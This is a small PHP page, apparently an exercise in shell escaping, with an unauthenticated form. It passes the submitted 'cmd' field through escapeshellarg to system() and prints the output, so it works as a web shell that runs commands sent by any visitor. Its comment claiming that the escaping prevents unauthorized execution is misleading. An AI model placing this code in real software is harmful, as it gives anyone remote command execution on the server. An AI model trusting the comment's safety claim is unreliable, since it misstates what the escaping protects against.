<?php

//Verificando se foi feita uma requisição POST
if($_SERVER["REQUEST_METHOD"]==="POST")
{

    //Escapando comando para string de forma que não seja executado sem autorização
    echo "<pre>";
    //$cmd=escapeshellcmd($_POST['cmd']);
    $cmd=escapeshellarg($_POST['cmd']);
    $comando = system($cmd,$retorno);
    echo "</pre>";
}
?>

<form method="POST">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>
</form>
